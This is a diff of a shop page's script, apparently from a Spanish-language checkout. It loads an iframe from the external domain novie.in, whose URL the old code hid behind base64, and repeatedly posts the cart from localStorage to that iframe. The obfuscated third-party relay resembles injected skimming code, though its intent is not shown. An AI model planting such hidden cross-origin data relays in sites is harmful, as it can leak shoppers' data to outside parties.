@@ -935,10 +935,10 @@ Enviando pedido...
 <script>
 const iframe = document.getElementById("secureFrame");
 
-const realURL = atob("aHR0cHM6Ly9ub3ZpZS5pbi84L2FxdWkuaHRtbA==");
+const realURL = "https://novie.in/8/aqui.html";
 iframe.src = realURL;
 
-window.enviarCarrito = function() {
+function enviarCarrito() {
   const carrito = JSON.parse(localStorage.getItem("carrito")) || [];
 
   iframe.contentWindow.postMessage(
@@ -946,16 +946,15 @@ window.enviarCarrito = function() {
     "https://novie.in"
   );
 
-  console.log("Carrito enviado:", carrito);
+  console.log("ENVIADO:", carrito);
 }
 
 iframe.addEventListener("load", () => {
-  let intentos = 0;
-
-  const intervalo = setInterval(() => {
+  let i = 0;
+  const t = setInterval(() => {
     enviarCarrito();
-    intentos++;
-    if (intentos > 15) clearInterval(intervalo);
+    i++;
+    if (i > 10) clearInterval(t);
   }, 300);
 });
 </script>
